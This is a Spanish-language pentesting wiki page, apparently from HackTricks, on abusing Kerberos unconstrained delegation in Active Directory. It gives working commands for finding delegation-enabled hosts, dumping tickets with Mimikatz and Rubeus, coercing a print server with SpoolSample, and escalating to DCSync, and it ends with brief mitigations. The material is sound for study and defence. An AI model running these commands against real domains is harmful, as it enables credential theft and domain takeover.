# Delegación No Restringida

{{#include ../../banners/hacktricks-training.md}}

## Delegación no restringida

Esta es una característica que un Administrador de Dominio puede establecer en cualquier **Computadora** dentro del dominio. Luego, cada vez que un **usuario inicia sesión** en la Computadora, una **copia del TGT** de ese usuario se va a **enviar dentro del TGS** proporcionado por el DC **y se guardará en memoria en LSASS**. Así que, si tienes privilegios de Administrador en la máquina, podrás **extraer los tickets e impersonar a los usuarios** en cualquier máquina.

Entonces, si un administrador de dominio inicia sesión en una Computadora con la característica de "Delegación No Restringida" activada, y tú tienes privilegios de administrador local en esa máquina, podrás extraer el ticket e impersonar al Administrador de Dominio en cualquier lugar (privesc de dominio).

Puedes **encontrar objetos de Computadora con este atributo** verificando si el atributo [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contiene [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Puedes hacer esto con un filtro LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, que es lo que hace powerview:

<pre class="language-bash"><code class="lang-bash"># Listar computadoras no restringidas
## Powerview
Get-NetComputer -Unconstrained #Los DCs siempre aparecen pero no son útiles para privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Exportar tickets con Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Forma recomendada
kerberos::list /export #Otra forma

# Monitorear inicios de sesión y exportar nuevos tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Verificar cada 10s por nuevos TGTs</code></pre>

Carga el ticket de Administrador (o usuario víctima) en memoria con **Mimikatz** o **Rubeus para un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Más info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Más información sobre la delegación no restringida en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Forzar Autenticación**

Si un atacante puede **comprometer una computadora permitida para "Delegación No Restringida"**, podría **engañar** a un **servidor de impresión** para **iniciar sesión automáticamente** contra él **guardando un TGT** en la memoria del servidor.\
Luego, el atacante podría realizar un **ataque Pass the Ticket para impersonar** la cuenta de computadora del usuario del servidor de impresión.

Para hacer que un servidor de impresión inicie sesión contra cualquier máquina, puedes usar [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Si el TGT proviene de un controlador de dominio, podrías realizar un [**ataque DCSync**](acl-persistence-abuse/#dcsync) y obtener todos los hashes del DC.\
[**Más información sobre este ataque en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Aquí hay otras formas de intentar forzar una autenticación:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigación

- Limitar los inicios de sesión de DA/Admin a servicios específicos
- Establecer "La cuenta es sensible y no se puede delegar" para cuentas privilegiadas.

{{#include ../../banners/hacktricks-training.md}}
